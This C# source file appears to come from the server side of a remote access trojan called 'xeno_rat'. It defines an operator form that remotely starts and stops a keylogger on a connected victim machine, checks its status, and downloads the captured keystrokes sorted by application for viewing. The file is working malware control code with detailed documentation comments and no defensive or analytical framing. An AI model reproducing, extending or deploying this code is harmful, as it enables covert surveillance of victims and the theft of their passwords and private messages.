using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace xeno_rat_server.Forms
{
    public partial class OfflineKeylogger : Form
    {
        Node client;
        bool started = false;
        Dictionary<string, string> applications = new Dictionary<string, string>();
        public OfflineKeylogger(Node _client)
        {
            client = _client;
            client.AddTempOnDisconnect(OnTempDisconnect);
            InitializeComponent();
            InitializeAsync();
        }

        /// <summary>
        /// Handles the event of temporary disconnection of a node.
        /// </summary>
        /// <param name="node">The node that has been temporarily disconnected.</param>
        /// <remarks>
        /// If the current object is disposed, the method returns without performing any action.
        /// Displays a message box with the text "Socket closed!".
        /// Invokes the <see cref="Close"/> method on the current object using <see cref="Control.BeginInvoke(Delegate)"/>.
        /// Any exceptions that occur during the invocation are caught and ignored.
        /// </remarks>
        private void OnTempDisconnect(Node node) 
        {
            if (this.IsDisposed) return;
            MessageBox.Show("Socket closed!");
            try
            {
                this.BeginInvoke((MethodInvoker)(() =>
                {
                    this.Close();
                }));
            }
            catch { }
            
        }

        /// <summary>
        /// Checks if the client is started and returns a boolean value indicating the status.
        /// </summary>
        /// <returns>True if the client is started; otherwise, false.</returns>
        /// <remarks>
        /// This method sends a byte array with a single element of value 0 to the client using the SendAsync method.
        /// It then receives a byte array from the client using the ReceiveAsync method and checks if the received data is null or has a length different from 1.
        /// If the data does not meet the expected criteria, the method disconnects the client and returns false.
        /// Otherwise, it returns true if the first element of the received data is equal to 1.
        /// </remarks>
        /// <exception cref="System.InvalidOperationException">Thrown when an asynchronous operation is not valid for the current state of the object.</exception>
        private async Task<bool> IsStarted() 
        {
            await client.SendAsync(new byte[] { 0 });
            byte[] data = await client.ReceiveAsync();
            if (data == null || data.Length != 1) 
            {
                client.Disconnect();
                return false;
            }
            return data[0] == 1;
        }

        /// <summary>
        /// Asynchronously initializes the object by receiving data from the client and updating the status.
        /// </summary>
        /// <remarks>
        /// This method asynchronously receives data from the client using the <paramref name="client"/> and updates the status.
        /// If the received data is null, has a length not equal to 1, or the first element is not equal to 1, an error message is displayed.
        /// If the object is disposed, the method returns without further processing.
        /// If an error occurs during the process of displaying the error message and closing the object, it is caught and ignored.
        /// </remarks>
        /// <exception cref="System.ObjectDisposedException">Thrown when the object is disposed.</exception>
        /// <returns>A task representing the asynchronous operation.</returns>
        private async Task InitializeAsync() 
        {
            byte[] data=await client.ReceiveAsync();
            if (data == null||data.Length!=1||data[0]!=1) 
            {
                if (this.IsDisposed) return;
                MessageBox.Show("There was an error!");
                try
                {
                    this.BeginInvoke((MethodInvoker)(() =>
                    {

                        this.Close();
                    }));
                }
                catch { }
                
            }
            await UpdateStatus();
        }

        /// <summary>
        /// Starts the keylogger by sending a byte array with value 1 to the client asynchronously.
        /// </summary>
        /// <returns>A task representing the asynchronous operation.</returns>
        /// <exception cref="Exception">Thrown when an error occurs while sending the byte array to the client.</exception>
        private async Task StartKeylogger() 
        {
            await client.SendAsync(new byte[] { 1 });
        }

        /// <summary>
        /// Stops the keylogger by sending a byte array with value 2 to the client asynchronously.
        /// </summary>
        /// <remarks>
        /// This method sends a byte array with value 2 to the client using an asynchronous operation to stop the keylogger.
        /// </remarks>
        private async Task StopKeylogger()
        {
            await client.SendAsync(new byte[] { 2 });
        }

        /// <summary>
        /// Asynchronously retrieves keylogs from the client and returns them as a dictionary.
        /// </summary>
        /// <returns>A dictionary containing the keylogs received from the client.</returns>
        /// <remarks>
        /// This method sends a byte array with the value 3 to the client using the SendAsync method of the client object.
        /// It then receives a byte array from the client using the ReceiveAsync method of the client object.
        /// If the received data is null, the method disconnects from the client and returns an empty dictionary.
        /// If an exception occurs during the conversion of the received byte array to a dictionary using the ConvertBytesToDictionary method,
        /// the method catches the exception and returns an empty dictionary.
        /// </remarks>
        private async Task<Dictionary<string, string>> GetKeylogs() 
        {
            Dictionary<string, string> retval = new Dictionary<string, string>() { };
            await client.SendAsync(new byte[] { 3 });
            byte[] data = await client.ReceiveAsync();
            if (data == null)
            {
                client.Disconnect();
                return retval;
            }
            try 
            {
                return ConvertBytesToDictionary(data, 0);
            } 
            catch 
            {
                return retval;
            }
        }

        /// <summary>
        /// Updates the status and displays it on the label.
        /// </summary>
        /// <remarks>
        /// This method asynchronously updates the status by calling the IsStarted method and then updates the label to display the current status.
        /// </remarks>
        private async Task UpdateStatus() 
        {
            started = await IsStarted();
            label3.BeginInvoke((MethodInvoker)(() =>
            {
                label3.Text = "Status: " + started.ToString();
            }));
            
        }

        /// <summary>
        /// Replaces the placeholders [enter] and [space] in the input string with the corresponding newline and space characters, respectively, and returns the modified string.
        /// </summary>
        /// <param name="input">The input string containing placeholders to be replaced.</param>
        /// <returns>The modified string with placeholders replaced.</returns>
        public string Normalize(string input)
        {
            return input.Replace("[enter]", Environment.NewLine).Replace("[space]", " ");
        }

        /// <summary>
        /// Converts a byte array to a dictionary of strings using null-terminated strings as keys and values.
        /// </summary>
        /// <param name="data">The byte array to be converted.</param>
        /// <param name="offset">The offset in the byte array from which to start the conversion.</param>
        /// <returns>A dictionary containing the key-value pairs extracted from the byte array.</returns>
        /// <remarks>
        /// This method iterates through the byte array starting from the specified offset, extracting null-terminated strings as keys and values for the dictionary.
        /// It uses a StringBuilder to accumulate the characters until a null terminator is encountered, indicating the end of a key or a value.
        /// The extracted key-value pairs are then added to the dictionary, and the method returns the resulting dictionary.
        /// </remarks>
        private static Dictionary<string, string> ConvertBytesToDictionary(byte[] data, int offset)
        {
            Dictionary<string, string> dictionary = new Dictionary<string, string>();
            string currentKey = null;
            StringBuilder currentValue = new StringBuilder();

            for (int i = offset; i < data.Length; i++)
            {
                byte currentByte = data[i];

                if (currentByte == 0)
                {
                    // Null terminator indicates the end of a key or a value
                    if (currentKey == null)
                    {
                        currentKey = currentValue.ToString(); // Use ToString to get the string
                        currentValue.Clear();
                    }
                    else
                    {
                        dictionary[currentKey] = currentValue.ToString(); // Use ToString to get the string
                        currentKey = null;
                        currentValue.Clear();
                    }
                }
                else
                {
                    currentValue.Append((char)currentByte);
                }
            }

            return dictionary;
        }

        /// <summary>
        /// Event handler for the form load event.
        /// </summary>
        /// <param name="sender">The source of the event.</param>
        /// <param name="e">An <see cref="EventArgs"/> that contains the event data.</param>
        private void OfflineKeylogger_Load(object sender, EventArgs e)
        {

        }

        /// <summary>
        /// Handles the event when an item in the list view is activated.
        /// </summary>
        /// <param name="sender">The source of the event.</param>
        /// <param name="e">An EventArgs that contains the event data.</param>
        /// <remarks>
        /// This method checks if any item is selected in the list view. If an item is selected, it retrieves the text from the first column of the selected item in the list view and sets the text of textBox1 to the normalized value of the corresponding application from the 'applications' dictionary.
        /// </remarks>
        private void listView1_ItemActivate(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                string firstColumnText = listView1.SelectedItems[0].SubItems[0].Text;
                textBox1.Text = Normalize(applications[firstColumnText]);
            }
        }

        /// <summary>
        /// Starts the keylogger and updates the status.
        /// </summary>
        /// <remarks>
        /// This method asynchronously starts the keylogger and updates the status.
        /// </remarks>
        private async void button1_Click(object sender, EventArgs e)
        {
            await StartKeylogger();
            await UpdateStatus();
        }

        /// <summary>
        /// Stops the keylogger and updates the status asynchronously.
        /// </summary>
        /// <remarks>
        /// This method asynchronously stops the keylogger and updates the status.
        /// </remarks>
        private async void button2_Click(object sender, EventArgs e)
        {
            await StopKeylogger();
            await UpdateStatus();
        }

        /// <summary>
        /// Updates the status and retrieves keylogs, then populates the UI with the retrieved data.
        /// </summary>
        /// <remarks>
        /// This method asynchronously updates the status and retrieves keylogs. If no keylogs are retrieved, the method returns without populating the UI.
        /// If keylogs are retrieved, the method populates the UI with the retrieved data.
        /// </remarks>
        /// <exception cref="Exception">Thrown when an error occurs while updating the status or retrieving keylogs.</exception>
        /// <returns>No explicit return value.</returns>
        private async void button3_Click(object sender, EventArgs e)
        {
            await UpdateStatus();
            Dictionary<string,string> data=await GetKeylogs();
            if (data.Count == 0) 
            {
                return;
            }
            applications = data;
            try
            {
                textBox1.Text = "";
                listView1.BeginInvoke((MethodInvoker)(() =>
                {
                    listView1.Items.Clear();
                    foreach (string i in applications.Keys)
                    {
                        listView1.Items.Add(new ListViewItem(i));
                    }
                }));
            }
            catch { }

        }
    }
}
